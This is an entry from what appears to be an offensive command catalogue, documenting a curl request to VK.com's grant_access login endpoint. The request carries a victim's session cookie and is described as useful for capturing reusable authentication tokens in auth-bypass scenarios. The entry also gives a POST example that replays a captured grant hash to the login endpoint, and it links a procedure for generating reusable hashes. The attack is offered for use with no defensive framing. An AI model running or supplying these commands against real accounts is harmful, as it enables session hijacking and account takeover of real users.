---
id: cmd-curl-vk-grant-316078
data: >-
  curl -X GET
  "https://login.vk.com/?act=grant_access&ip_h=example_ip&hash=initial_session_hash"
  -H "Cookie: session_id=victim_session" -v
tags:
  - web
  - auth
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:47.563Z'
verified: false
validated: true
submitted: true
---
# curl-grant-access-request

## Command

```bash
curl -X GET "https://login.vk.com/?act=grant_access&ip_h=example_ip&hash=initial_session_hash" -H "Cookie: session_id=victim_session" -v
```

## Description

This command sends a GET request to VK.com's grant_access endpoint to generate or interact with authentication hashes, useful for capturing reusable tokens in auth bypass scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `https://login.vk.com/?act=grant_access` | Target endpoint URL | Yes |
| `&ip_h=example_ip` | IP hash parameter from session | Yes |
| `&hash=initial_session_hash` | Initial session hash | Yes |
| `-H "Cookie: session_id=victim_session"` | Victim's session cookie | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://login.vk.com/?act=grant_access" -H "Cookie: session_id=abc123" -v
```

### Advanced Usage

```bash
curl -X POST "https://login.vk.com/?act=login" -d "grant_hash=captured_hash" -H "Cookie: session_id=abc123" -v
```

## Expected Output

Verbose HTTP response including headers and body with generated hash or auth details, e.g., JSON containing hash without expiration.

## Related

- [[Related Procedure: Generate-Reusable-Grant-Access-Hash]]
